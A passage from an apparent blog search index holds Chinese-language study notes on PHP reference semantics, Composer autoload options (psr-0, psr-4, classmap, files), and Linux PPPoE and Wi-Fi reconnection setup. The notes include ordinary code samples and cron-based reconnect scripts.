","date":"2019-01-28","objectID":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/:0:0","tags":["php"],"title":"PHP有關參照(Reference)的那些事","uri":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"categories":["PHP"],"content":"PHP 參照不是指針(pointer) PHP: 引用是什么 - Manual 在 PHP 中引用意味著用不同的名字訪問同一個變量內容。這並不像 C 的指針：例如你不能對他們做指針運算，他們並不是實際的內存地址…… 查看引用不是什麼瞭解更多信息。 替代的是，引用是符號表別名。注意在PHP 中，變量名和變量內容是不一樣的， 因此同樣的內容可以有不同的名字。最接近的比喻是 Unix 的文件名和文件本身——變量名是目錄條目，而變量內容則是文件本身。引用可以被看作是 Unix 文件系統中的硬鏈接。 這樣看真的沒有懂 直接看下面的User Contributed Notes人家給的範例 \u003c?php var = \"foo\"; $ref1 =\u0026 $var; // new object that references $var $ref2 =\u0026 $ref1; // references $var directly, not $ref1!!!!! echo $ref1; // \u003efoo unset($ref1); echo $ref1; // \u003eNotice: Undefined variable: ref1 echo $ref2; // \u003efoo echo $var; // \u003efoo ?\u003e 其實這個範例可以很簡單看出來，刪除unset $ref1變數不會影響到$ref2 這個我記得在 Java 會直接 byebye JavaScript 發現不能用 delete object，看來要找天測試是為什麼delete operator | MDN 再看PHP: 引用做什么 - Manual \u003c?php $a =\u0026 $b; ?\u003e Note: $a 和 $b 在這裡是完全相同的，這並不是 $a 指向了 $b 或者相反，而是 $a 和 $b 指向了同一個地方。 如果具有引用的數組被拷貝，其值不會解除引用。對於數組傳值給函數也是如此。 ","date":"2019-01-28","objectID":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/:1:0","tags":["php"],"title":"PHP有關參照(Reference)的那些事","uri":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"categories":["PHP"],"content":"參照 \u003c?php $a = 1; $b = \u0026$a; $b++; $c = $b; $a = 0; var_dump($c); #2 \u003c?php $a = 1; $b = \u0026$a; $b++; $c = \u0026$b; $a = 0; var_dump($c); #0 ","date":"2019-01-28","objectID":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/:2:0","tags":["php"],"title":"PHP有關參照(Reference)的那些事","uri":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"categories":["PHP"],"content":"官網神奇的範例… 如果對一個未定義的變量進行引用賦值、引用參數傳遞或引用返回，則會自動創建該變量。 這一段真的很神奇…，不過應該是 function 會宣告上面的變數。 \u003c?php function foo(\u0026$var) { } foo($a); // $a is \"created\" and assigned to null $b = array(); foo($b['b']); var_dump(array_key_exists('b', $b)); // bool(true) $c = new StdClass; foo($c-\u003ed); var_dump(property_exists($c, 'd')); // bool(true) ?\u003e ","date":"2019-01-28","objectID":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/:3:0","tags":["php"],"title":"PHP有關參照(Reference)的那些事","uri":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"categories":["PHP"],"content":"官方下面的範例 以下有毒，假如理解不能請不要再深入，有可能會走火入魔 以下有毒，假如理解不能請不要再深入，有可能會走火入魔 以下有毒，假如理解不能請不要再深入，有可能會走火入魔 目前簡單用我想的方法 沒有用\u0026當做copy覆蓋到當前(箭頭)位置的值 用\u0026當作這個變數(箭頭)重新指向到某一個位置(跟 linux hard link 一樣) 以下注解是我用自已方法去記錄的，有錯誤也請不要見怪 \u003c?php //if you do: $a = \"hihaha\"; $b = \u0026$a; $c = \"eita\"; $b = $c; echo $a; // shows \"eita\" # $b指向為$a位置，$b的位置改當然$a也會跟著換 $a = \"hihaha\"; $b = \u0026$a; $c = \"eita\"; $b = \u0026$c; echo $a; // shows \"hihaha\" # **這邊是重點** # $b範例都是參照位置 # 其實很容易被Java Reference帶著走 $a = \"hihaha\"; $b = \u0026$a; $b = null; echo $a; // shows nothing (both are set to null) $a = \"hihaha\"; $b = \u0026$a; unset($b); echo $a; // shows \"hihaha\" ?\u003e 2019-02-20 簡單小記 $b值為=右邊變數的值(先不管有沒有\u0026) 當然不一樣的結果在於前面的$b=\u0026 ","date":"2019-01-28","objectID":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/:4:0","tags":["php"],"title":"PHP有關參照(Reference)的那些事","uri":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"categories":["PHP"],"content":"用自已的方法手畫上面前四個範例 簡單來說，我有一個方法不會搞混 首先，分兩部份 第一部份是 變數名字 第二部份是 記錄框框資料 兩個部份會有一個箭頭做關連 \u003c?php $a = 1; $b = $a; 平常給值是 ","date":"2019-01-28","objectID":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/:5:0","tags":["php"],"title":"PHP有關參照(Reference)的那些事","uri":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"categories":["PHP"],"content":"PHP5 new 物件預設是參照 自 PHP 5 起，new 自动返回引用，因此在此使用 =\u0026 已经过时了并且会产生 E_STRICT 级别的消息。 ","date":"2019-01-28","objectID":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/:6:0","tags":["php"],"title":"PHP有關參照(Reference)的那些事","uri":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"categories":["PHP"],"content":"Global 變數使用參照 百思不得其解的範例，官方有說明global $var; 是 $var =\u0026 $GLOBALS['var']; 的簡寫。 但要熟悉上面規則，就能理解下方程式為什麼不會影響外面的$var2(全域變數) 這可能沒有深入了解 PHP 參照，可能會很難理解 下範例外面的 Global 使用參照，卻不會影響全域變數 \u003c?php $var1 = \"Example variable\"; $var2 = \"\"; function global_references($use_globals) { global $var1, $var2; if (!$use_globals) { $var2 =\u0026 $var1; // visible only inside the function echo 'var2:' . $var2 . ',' . $GLOBALS[\"var2\"]. PHP_EOL; } else { $GLOBALS[\"var2\"] =\u0026 $var1; // visible also in global context } } global_references(false); echo \"var2 is set to '$var2'\\n\"; // var2 is set to '' global_references(true); echo \"var2 is set to '$var2'\\n\"; // var2 is set to 'Example variable' ?\u003e 這個範例其實跟上一個例子一樣 其實他是參照到別的地方 話說我剛好也不是很了解 php global 趁這個機會了解 PHP: What References Are Not - Manual 原 function 的$var是參照$bar 但是$var =\u0026 $GLOBALS[“baz”]; 簡單來說 \u003c?php function foo(\u0026$var) { $var =\u0026 $GLOBALS[\"baz\"]; } foo($bar); ?\u003e 這邊用 global 感覺容易混淆 \u003c?php //Enter your code here, enjoy! $bar = 1; function foo(\u0026$var) { $a = 2; $var =\u0026 $a; } foo($bar); echo $bar; #1 感覺foo(\u0026$var)使用上等於區域變數 $var = \u0026 全域變數 $bar($var = \u0026$GLOBAL[‘bar’]) 所以到最後重新指向位置並不會影響$bar ","date":"2019-01-28","objectID":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/:7:0","tags":["php"],"title":"PHP有關參照(Reference)的那些事","uri":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"categories":["PHP"],"content":"Returning References \u003c?php class foo { public $value = 42; public function \u0026getValue() { return $this-\u003evalue; } } $obj = new foo; $myValue = \u0026$obj-\u003egetValue(); // $myValue is a reference to $obj-\u003evalue, which is 42. $obj-\u003evalue = 2; echo $myValue; // prints the new value of $obj-\u003evalue, i.e. 2. ?\u003e 簡單來說，Returning References 用在物件導向需要兩個\u0026 最近看 Codeigiter 原程式有用function \u0026xxxx 一直在想這個為什麼要這樣用… 在想是不是之後會帶入到 function，防止不是參照(以下自己猜測，但後來想想好像不是，看看就好= =a) 讓 functiont 產生Only variables should be passed by reference(詳細請看下面內容) 不過有在官網看到PHP: 變量範圍 - Manual 目前還不確定是不是這個關係 在 Zend 引擎 1 代，它驅動了 PHP4，對於變量的 static 和 global 定義是以引用的方式實現的。例如，在一個函數域內部用 global 語句導入的一個真正的全局變量實際上是建立了一個到全局變量的引用。這有可能導致預料之外的行為，如以下例子所演示的： // 類似的行為也適用於 static 語句。引用並不是靜態地存儲的： //以下code為php4 \u003c?php function \u0026get_instance_ref() { static $obj; echo 'Static object: '; var_dump($obj); if (!isset($obj)) { // 將一個引用賦值給靜態變量 $obj = \u0026new stdclass; } $obj-\u003eproperty++; return $obj; } function \u0026get_instance_noref() { static $obj; echo 'Static object: '; var_dump($obj); if (!isset($obj)) { // 將一個對象賦值給靜態變量 $obj = new stdclass; } $obj-\u003eproperty++; return $obj; } $obj1 = get_instance_ref(); $still_obj1 = get_instance_ref(); echo \"\\n\"; $obj2 = get_instance_noref(); $still_obj2 = get_instance_noref(); ?\u003e 官網還有提到一個可能會遇到的錯誤問題 [PHP]Only variables should be passed by reference - 王永濤的个人页面 - 开源中国 PHP: Only variables should be passed by reference – James’ Desk 首先先提提array_push(array(), 'foo');，程式會顯示錯誤，原因需要這個變數被實例 \u003c?php function \u0026collector() { static $collection = array(); return $collection; } array_push(collector(), 'foo'); ?\u003e 假如 \u003c?php function collector() { static $collection = array(); return $collection; } array_push(collector(), 'foo'); ?\u003e 程式會顯示 Only variables should be passed by reference ","date":"2019-01-28","objectID":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/:8:0","tags":["php"],"title":"PHP有關參照(Reference)的那些事","uri":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"categories":["PHP"],"content":"Passing by Reference \u003c?php function foo(\u0026$var) { $var++; } $a=5; foo($a); // $a is 6 here ?\u003e 官網有給之前提過的錯誤，Only variables should be passed by reference問題 \u003c?php function foo(\u0026$var) { $var++; } function bar() // Note the missing \u0026 { $a = 5; return $a; } foo(bar()); // Produces fatal error as of PHP 5.0.5, strict standards notice // as of PHP 5.1.1, and notice as of PHP 7.0.0 foo($a = 5); // Expression, not variable foo(5); // Produces fatal error class Foobar { } foo(new Foobar()) // Produces a notice as of PHP 7.0.7 // Notice: Only variables should be passed by reference ?\u003e ","date":"2019-01-28","objectID":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/:9:0","tags":["php"],"title":"PHP有關參照(Reference)的那些事","uri":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"categories":["PHP"],"content":"Unsetting References \u003c?php $a = 1; $b =\u0026 $a; unset($a); var_dump($a); # null var_dump($b); # 1 ?\u003e won’t unset $b, just $a. Again, it might be useful to think about this as analogous to the Unix unlink call. 用 Linux 的 link hard 觀念確實方便理解 ","date":"2019-01-28","objectID":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/:10:0","tags":["php"],"title":"PHP有關參照(Reference)的那些事","uri":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"categories":["PHP"],"content":"Spotting References ","date":"2019-01-28","objectID":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/:11:0","tags":["php"],"title":"PHP有關參照(Reference)的那些事","uri":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"categories":["PHP"],"content":"global References When you declare a variable as global $var you are in fact creating reference to a global variable. That means, this is the same as: \u003c?php $var =\u0026 $GLOBALS[\"var\"]; ?\u003e This also means that unsetting $var won’t unset the global variable. 意思是 unset 變數也不會影響到全域變數 ","date":"2019-01-28","objectID":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/:11:1","tags":["php"],"title":"PHP有關參照(Reference)的那些事","uri":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"categories":["PHP"],"content":"$this In an object method, $this is always a reference to the called object. $this 參照呼叫實例物件 ","date":"2019-01-28","objectID":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/:11:2","tags":["php"],"title":"PHP有關參照(Reference)的那些事","uri":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"categories":["PHP"],"content":"心得 費很多功夫整理這個，光吸收可能需要花費一堆時間 因為想進入 PHP 領域，了解這個應該也是必經之道 平常也很少機會用\u0026這玩意吧 有空整理一下 PHP 物件導向觀念。 ","date":"2019-01-28","objectID":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/:12:0","tags":["php"],"title":"PHP有關參照(Reference)的那些事","uri":"/blog/posts/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"categories":["Linux"],"content":"在使用Linux 使用 pppoe 連線方法小記 | 程式狂想筆記後 重開機發現不能上網 我還以為是 wifi 壞掉 好在最後查到原因 在此筆記 首先，我在sudo vim /etc/network/interfaces # interfaces(5) file used by ifup(8) and ifdown(8) auto lo iface lo inet loopback iface dsl-provider inet ppp pre-up /bin/ip link set wlp3s0 up # line maintained by pppoeconf provider dsl-provider auto wlp3s0 iface wlp3s0 inet manual 在意開始之前，只有這兩段 auto lo iface lo inet loopback 不過，重開機才能確定網路才能設定到 後來網路上找到sudo service networking restart 不過我在 ElementaryOS 上沒有什麼效果 後來 sudo service network-manager restart 發現桌面右上角圖示有重新載入 可正常載入網路狀況 最後發現是iface wlp3s0 inet manual這段影響的 不過我還是保留一開始的那兩行 註解掉後還是能用 pppoe 連線 網路設定我就不深入研究了，相關 Linux 設定方法如下 Debian / Ubuntu Linux 網路設定範例 | Tsung’s Blog Linux 网络接口配置（/etc/network/interfaces） - 邱凯翔 Edward 的个人博客 - CSDN 博客 第 5 章 網絡設置 葉難: Raspberry Pi：固定私有 IP 與 dhcpcd 树莓派 3 设置静态 ip dhcpcd vs /etc/network/interfaces - yjbaobo 的博客 - CSDN 博客 重新檢查連線 小狐狸事務所: 樹莓派自動偵測網路斷線時重開機的方法 Rebooting the Raspberry Pi when it loses wireless connection | We Work We Play ping -c4 192.168.1.1 \u003e /dev/null if [ $? != 0 ] then sudo /sbin/shutdown -r now fi */5 * * * * /usr/bin/sudo -H /usr/local/bin/checkwifi.sh » /dev/null 2\u003e\u00261 ping -c4 192.168.1.1 \u003e /dev/null if [ $? != 0 ] then echo \"No network connection, restarting wlan0\" /sbin/ifdown 'wlan0' sleep 5 /sbin/ifup --force 'wlan0' fi 2.為了要使raspberry pi 不要進入省電或自動將無線網路關掉 參考:IT學習日誌: [Raspberry Pi 2 ModelB] 無線網路常常斷線解決方法 在/etc/network/interfaces 加上一行 wireless-power off 外 修改 /etc/kbd/config 將 BLANK_TIME= 改為 BLANK_TIME=0 和 POWERDOWN_TIME= 改為 POWERDOWN_TIME=0 ","date":"2019-01-27","objectID":"/blog/posts/Linux%E5%9C%A8Wifi%E4%BD%BF%E7%94%A8pppoe%E9%80%A3%E7%B7%9A%E5%BE%8C%E9%87%8D%E9%96%8B%E6%A9%9F%E4%B8%8D%E8%83%BD%E9%80%A3%E7%B7%9A%E4%B8%8A%E7%B6%B2/:0:0","tags":["wifi","linux"],"title":"Linux在Wifi使用pppoe連線後，重開機不能連線上網","uri":"/blog/posts/Linux%E5%9C%A8Wifi%E4%BD%BF%E7%94%A8pppoe%E9%80%A3%E7%B7%9A%E5%BE%8C%E9%87%8D%E9%96%8B%E6%A9%9F%E4%B8%8D%E8%83%BD%E9%80%A3%E7%B7%9A%E4%B8%8A%E7%B6%B2/"},{"categories":["Linux"],"content":"最近在好奇 pppoe 到底能不能走 wifi google 一下發現[問題] 走 Wi-Fi 可以搭配 PPPoE 嗎? - 看板 NextTV - 批踢踢實業坊 這篇有人說可以也有人說不行… 其中一段cassine:PPPoE顧名思義就是PPP over Ethernet，不是PPP over WiFi 感覺還滿有道理的 不過還是有看到留言說可以使用 今天要來破解是不是真的… 好啦，突然想到家裡有一台 surface 直接連 wifi 做 pppoe 連線就可以馬上知道結果 結果可以 但是不知道 Linux 能不能用? 簡單記錄一下怎麼使用 # 安裝pppoeconf sudo apt-get install pppoeconf # 設定 sudo pppoeconf 設定可以參考沉思的伊文: Raspberry Pi 樹莓派 ADSL PPPoE 連線到網際網路 ’noauth’跟’defaultroute’這個選 yes 向配置文件添加 『noauth' 和 『defaultroute' noauth 不認證遠端身份，家庭寬帶默認 Yes 即可 defaultroute 添加默認路由，不手動改路由表或者特殊需求默認 Yes 即可 參考[【家庭服务器计划】pppoeconf | Debian 配置 PPPOE 上网 – Lensual‘s Space](https://lensual.space/brain-hole/846.html) linux 添加静态路由 - leon - CSDN 博客 MTU 選項也選 yes 詳細:小議 TCP 的 MSS(最大分段)以及 MTU - 王朝網路 - wangchao.net.cn 【家庭服务器计划】pppoeconf | Debian 配置 PPPOE 上网 – Lensual‘s Space 裡面都詳細提到 MTU 最大傳輸單元，二層幀的淨荷 MSS 最大報文長度，TCP 協議特性，TCP 協議的淨荷，用於協商適應路徑中的 MTU Ethernet 的 MTU 為 1500 (Byte) ，超過 1500 的載荷 ( payload ) 將被分段，最大幀長度為 Eth Header(14) + Payload(1500) + FCS(4) = 1518 (Byte)。其實 FCS 用 wireshark 抓包看不到的，用於校驗已經被系統底層剔除。另外以太網規範還有前導碼和幀間隔，那些是用來底層收發控制相關的（誤 PPP 的 MTU 同為 1500，最大幀長度為 PPP Header(5) + Payload(1500) + FCS(2) + Flag(1) = 1508 (Byte)。 要把 PPP 塞進 Ethernet 就是 PPPOE，需要把 PPP 的 MTU 縮減才可以使得 PPP 滿足 Ethernet 的 MTU。 原來的 PPP 最大會出現 1508 的幀，現在需要控制在 1500 以內。PPP 的 MTU 就是 1500 – (1508 – 1500) = 1492。 所以 PPPOE 的 MTU 通常為 1492 (Byte) ，以便在 MTU 為 1500 的 Ethernet 上運行。 MSS 箝制(Clamping) 會修改 TCP SYN 的 MSS 以符合當前的 MTU。因為置於路由器後面的主機使用的是 MTU 為 1500 的 Ethernet 。雖然 ICMP 協議可以在傳輸過程中修正 TCP 的 MSS ，但是部分運營商和設備考慮到安全問題或者就是不想讓你 ping 和 tracertoute 免得投訴他們禁止了 ICMP 協議。 基本上設定都是 yes 連線 # 連線dsl-provider設定檔 pon dsl-provider # 斷線pppoe poff dsl-provider # 查詢狀態 plog ifconfig # 關閉全部pppoe poff -a PPPOE設定檔 /etc/ppp/peers/dsl-provider dsl-provider內紀錄ADSL連線相關參數（含帳號），可以修改成hinet以利識別，但改檔名後，pppoe_on_boot檔內的開機自動撥接的設定檔名稱也要跟著換，否則開機自動撥接功能會失效。 /etc/ppp/pppoe_on_boot 設定系統開機時自動撥接之設定檔，其中「exec pppd call dsl-provider」就是執行撥接時呼叫的設定檔 重新連線 scriptDebian Linux: ADSL PPPoE 自動重撥 Script | Tsung’s Blog 重新撥接的程式 及 設定步驟 重新撥接的程式如下: (vim /usr/bin/repppoe) #!/bin/bash #if !ping -c 3 168.95.1.1 \u003e /dev/null 2\u003e\u00261 #if !(cat /proc/net/dev | grep ppp0) \u003e /dev/null 2\u003e\u00261 #if !(cat /proc/net/dev | grep ppp) \u003e /dev/null 2\u003e\u00261 if !ping -c 3 tw.yahoo.com \u003e /dev/null 2\u003e\u00261 then #/usr/bin/poff #/usr/bin/pon dsl-provider /usr/bin/pon fi chmod +x /usr/bin/repppoe 設定 crontab (設 root 的 crontab) crontab -e # 之後寫入下述 */5 * * * * /usr/bin/repppoe 進入就到這邊，以後要用可以翻翻這篇。 小記…，發現 pon 可以一直新增 pppoe 連線 但好像最後面新增會做 default route 所以只會有一個 ip 才會連到 我一直以為都可以連… 但還是要小心，我記得 hinet 只能撥接 8 個 HiNet 客戶服務 \u003e 問題搜尋 \u003e 上網問題 參考來源: 沉思的伊文: Raspberry Pi 樹莓派 ADSL PPPoE 連線到網際網路 在 Linux 上拨号上网(PPPoE) | 光阴的故事 在 CentOS 7 設定 PPPoE 撥接功能 | Kevin Linul 網路日記本 鳥哥的 Linux 私房菜 – 連上 Internet 的方法與步驟 Ubuntu 網路設定 - PPPoE (ADSL) 指令 | 凍仁的筆記 【家庭服务器计划】pppoeconf | Debian 配置 PPPOE 上网 – Lensual‘s Space 【Linux】pppoe 網路撥接設定 @ 等待 :: 痞客邦 :: 設定 ADSL（PPPOE）連線 | Gavaee’s Blog Debian Linux: ADSL PPPoE 自動重撥 Script | Tsung’s Blog ","date":"2019-01-26","objectID":"/blog/posts/Linux%E4%BD%BF%E7%94%A8pppoe%E9%80%A3%E7%B7%9A%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/:0:0","tags":["pppoe","network"],"title":"Linux使用pppoe連線方法小記","uri":"/blog/posts/Linux%E4%BD%BF%E7%94%A8pppoe%E9%80%A3%E7%B7%9A%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"上次小玩 composer 的自動載入 但今天使用 autoload 發現我還不是很了解他的運作原理 psr0,psr4 差別也看不是很出來他們的差別 不過說真的，網路上幾乎都是忽略掉 psr0 可能也不要花太多心力在上面吧 先講講 composer 自動載入原理 原本想說他是載入 php 會自動載入全部 但無聊看了一下vendor/autoload.php原碼 裡面有用到spl_autoload 所以應該都是基於這個方式去自動載入 但這種自動載入跟檔名跟Class類別有關係 我之前測試classmap，只要檔名沒對到，`use function xxx`沒吃到 但是調整對的檔名，`use function xxx`就會吃到 上面那段是我無聊自己試的，其實正常不會用 use function 一個 php 一個 class 是最好的方式 ","date":"2019-01-19","objectID":"/blog/posts/composer%E4%BD%BF%E7%94%A8psr0-psr4-classmap-files%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5%E7%B4%80%E9%8C%84/:0:0","tags":["autoload","composer"],"title":"composer使用psr0,psr4,classmap,files自動載入筆記心得","uri":"/blog/posts/composer%E4%BD%BF%E7%94%A8psr0-psr4-classmap-files%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5%E7%B4%80%E9%8C%84/"},{"categories":["PHP"],"content":"classmap 這個指定相關目錄裡所有 php 都會載入 php 裡面的 class 但 php 未包含 class 不會載入進去 這個也很常在 composer 看到 但先說說我自己測試踩到一個雷 當載入沒宣告namespace時候 預設是會自動載入到全域 namespace 但是全域 namespace 不須要做use xxx 這時候做use xxx會發生錯誤 使用會造成錯誤 Warning: The use statement with non-compound name 'xxx' has no effect 這個別的網頁很少介紹這個 詳細 laravel 的 dataseeder.php 就是這樣設定的 檔案 autoload_classmap.php 'DatabaseSeeder' =\u003e $baseDir . '/database/seeds/DatabaseSeeder.php', ","date":"2019-01-19","objectID":"/blog/posts/composer%E4%BD%BF%E7%94%A8psr0-psr4-classmap-files%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5%E7%B4%80%E9%8C%84/:1:0","tags":["autoload","composer"],"title":"composer使用psr0,psr4,classmap,files自動載入筆記心得","uri":"/blog/posts/composer%E4%BD%BF%E7%94%A8psr0-psr4-classmap-files%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5%E7%B4%80%E9%8C%84/"},{"categories":["PHP"],"content":"files 載入指定的 PHP 都會載入進來，重點 class 也都會，其實這邊也可以做 namespace 但好像大家用全域 namespace 比較多 還是別亂用好了 XD ","date":"2019-01-19","objectID":"/blog/posts/composer%E4%BD%BF%E7%94%A8psr0-psr4-classmap-files%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5%E7%B4%80%E9%8C%84/:2:0","tags":["autoload","composer"],"title":"composer使用psr0,psr4,classmap,files自動載入筆記心得","uri":"/blog/posts/composer%E4%BD%BF%E7%94%A8psr0-psr4-classmap-files%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5%E7%B4%80%E9%8C%84/"},{"categories":["PHP"],"content":"PSR0 這篇已經被廢棄了!!建議可以跳過這邊 不然會跟 PSR4 搞混，千萬不要像我走火入魔!!!! 現在我還沒有看過 composer.json 有用到 \"psr-0\": { \"Psr0\\\\Lib\\\\\": \"psr0/lib/src/\" }, 上面簡單講，就是\"psr0/lib/src/“所存在 PSR0/lib/根目錄地方 所以對應項面檔案位置 psr0/lib/src/Psr0/Lib/Psr0LibClass.php psr0/lib/src/Psr0/Lib/Psr0LibClass.php \u003c?php // psr-0: \"Psr0\\\\Lib\\\\\": \"psr0/lib/src/\" namespace Psr0\\Lib; class Psr0LibClass { public static function index() { echo __CLASS__ . \"@\" . __FILE__ . PHP_EOL; } } ","date":"2019-01-19","objectID":"/blog/posts/composer%E4%BD%BF%E7%94%A8psr0-psr4-classmap-files%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5%E7%B4%80%E9%8C%84/:3:0","tags":["autoload","composer"],"title":"composer使用psr0,psr4,classmap,files自動載入筆記心得","uri":"/blog/posts/composer%E4%BD%BF%E7%94%A8psr0-psr4-classmap-files%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5%E7%B4%80%E9%8C%84/"},{"categories":["PHP"],"content":"PSR4 這個也很常在 composer.json 看到 相信剛入門一定對下面倒數兩行傻了 \"psr-4\": { \"Psr4\\\\Lib\\\\\": \"psr4/lib/src/\", \"App\\\\Controllers\\\\\": \"app/controllers/\", \"App\\\\Models\\\\\": \"app/models/\" psr4/lib/src/Psr4LibClass.php \u003c?php // psr-4: \"Psr4\\\\Lib\\\\\": \"psr4/lib/src/\" namespace Psr4\\Lib; class Psr4LibClass { public static function index() { echo __CLASS__ . \"@\" . __FILE__ . PHP_EOL; } } App\\\\Controllers\\\\和App\\\\Models\\\\怎麼可以投同時宣告 這邊先講我怎麼看這段在幹嘛 psr4/lib/src/目錄下，都已 Psr4\\Lib\\ namespace 宣告為主 以此類推 App\\\\Controllers\\\\→app/controllers/ App\\\\Models\\\\→app/models/ 好了，App\\\\Controllers\\\\和App\\\\Models\\\\怎麼可以投同時宣告 為什麼不要用'App\\\\': 'app' 千锋最新 php 视频教程完整 psr4Autoload 类_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili 看這邊解釋，講如這樣用App/Controllers/Contollers.php 不需要寫use App/Controllers/Controllers這麼繞口令 當然 App 資料夾不需要全部東西當 namespace，或者也可以把 namespace 客製化改短一點 EX: \"Controllers\\\\\": \"app/controllers/\", \"Models\\\\\": \"app/models/\" 相信看很難懂，實作比較快 composer 自动载入 autoload 的使用详解 psr0/psr4/classmap/files - big_cat - 开源中国 看這裡面內容，把所有 code 都在本機跑一下，很容易理解php -S 0.0.0.0:8000 ","date":"2019-01-19","objectID":"/blog/posts/composer%E4%BD%BF%E7%94%A8psr0-psr4-classmap-files%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5%E7%B4%80%E9%8C%84/:4:0","tags":["autoload","composer"],"title":"composer使用psr0,psr4,classmap,files自動載入筆記心得","uri":"/blog/posts/composer%E4%BD%BF%E7%94%A8psr0-psr4-classmap-files%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5%E7%B4%80%E9%8C%84/"},{"categories":["PHP"],"content":"autoload 他怎麼知道載入你自己 lib，跟 vendor 上的 lib // autoload_classmap.php @generated by Composer $vendorDir = dirname(dirname(__FILE__)); $baseDir = dirname($vendorDir); ... 'App\\\\VoteOption' =\u003e $baseDir . '/app/VoteOption.php', 'ArithmeticError' =\u003e $vendorDir . '/symfony/polyfill-php70/Resources/stubs/ArithmeticError.php', $vendorDir試紙 vendor 路徑 當然做 